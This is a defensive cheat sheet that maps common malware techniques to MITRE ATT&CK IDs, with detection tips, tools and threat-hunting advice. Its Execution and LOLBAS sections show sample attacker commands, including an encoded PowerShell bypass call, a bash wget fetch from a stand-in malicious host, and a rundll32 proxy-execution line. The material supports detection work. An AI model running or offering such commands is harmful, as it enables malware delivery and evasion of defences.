# Malware TTPs Mapping (MITRE ATT\&CK)

This document maps common malware behaviors and techniques to MITRE ATT\&CK TTPs and includes tools, detection tips, and response guidance.

---

## 🔍 Initial Access

### T1204 – **User Execution**

* Users run malware disguised as PDFs, installers, games, etc.
* **Delivery Methods:** Email, drive-by downloads, USBs
* **Detection:** Monitor file execution in temp/download folders
* **Tooling:** Email gateway logs, AV/EDR alerts

### T1566.001 – **Spearphishing Attachment**

* Malware embedded in Office docs/macros
* **Detection:** Monitor `.docm`, `.xlsm`, macro execution via Office telemetry
* **Tools:** Outlook message header analysis, VirusTotal, YARA

---

## 💣 Execution

### T1059 – **Command and Scripting Interpreter**

* Common for malware payloads via PowerShell, cmd, bash
* **Examples:**

  * `powershell -exec bypass -enc ...`
  * `bash -c "wget http://malicious[.]xyz/..."`
* **Detection:** Look for obfuscated scripts, encoded commands
* **Tools:** Sysmon, Splunk, Sigma rules

### T1106 – **Native API**

* Malware uses Windows API to perform malicious actions (e.g., `CreateRemoteThread`, `VirtualAlloc`)
* **Detection:** Monitor unusual process injection

---

## 🔐 Persistence

### T1547 – **Boot or Logon Autostart Execution**

* Malware ensures reboots won’t stop it
* **Methods:** Registry run keys, Startup folder, Scheduled Tasks
* **Detection:** Compare startup entries to baselines

---

## 🕵️‍♂️ Privilege Escalation

### T1055 – **Process Injection**

* Malware injects into legitimate processes (e.g., `explorer.exe`, `svchost.exe`)
* **Detection:** Look for unusual parent-child process pairs, memory allocation APIs
* **Tools:** Volatility, CrowdStrike, EDR logs

### T1068 – **Exploitation for Privilege Escalation**

* Exploits unpatched vulnerabilities (e.g., CVE-2021-40444)

---

## 🎛️ Defense Evasion

### T1027 – **Obfuscated Files or Information**

* Encoded PowerShell scripts, XORed payloads, encrypted droppers
* **Detection:** Look for high entropy files or base64 blobs

### T1218 – **Signed Binary Proxy Execution (LOLBAS)**

* Uses trusted binaries like `rundll32.exe`, `regsvr32.exe` to execute malicious code
* **Examples:**

  * `rundll32.exe shell32.dll,Control_RunDLL ...`

---

## 📡 Command and Control (C2)

### T1071.001 – **Application Layer Protocol: Web Traffic**

* C2 via HTTP(S) to evade detection
* **Detection:** Beaconing patterns, unusual domains/IPs
* **Tools:** Zeek, Suricata, Firewalls, DNS logs

### T1095 – **Non-Application Layer Protocol**

* Custom C2 channels (e.g., ICMP, TCP raw sockets)

---

## 🎯 Impact

### T1486 – **Data Encrypted for Impact (Ransomware)**

* Encrypts data using AES/RSA and drops ransom note
* **Detection:** Sudden spike in file rename/create events
* **Tools:** File Integrity Monitoring, backups, anti-ransomware tools

---

## 🧠 Threat Hunting Tips

* 🔍 Look for unusual child processes (e.g., Word spawning cmd.exe)
* ⚠️ Baseline scheduled tasks, services, registry keys
* 📦 Monitor outbound connections to unknown IPs/domains
* 🧪 Validate hashes and file signatures

---

## 🛡 Recommended Tools

* **Volatility / Redline** – Memory analysis
* **Sysmon** – Deep Windows telemetry
* **Wireshark / tshark** – Packet capture and inspection
* **MITRE ATT\&CK Navigator** – Visual mapping of TTPs

---

## 📚 References

* MITRE ATT\&CK: [https://attack.mitre.org/](https://attack.mitre.org/)
* LOLBAS Project: [https://lolbas-project.github.io/](https://lolbas-project.github.io/)
* Sigma Rules: [https://github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma)
* YARA Rules: [https://virustotal.github.io/yara/](https://virustotal.github.io/yara/)

---

> **Pro Tip**: Cross-reference this TTP map with your EDR alerts and IOC feeds for faster triage during malware outbreaks.
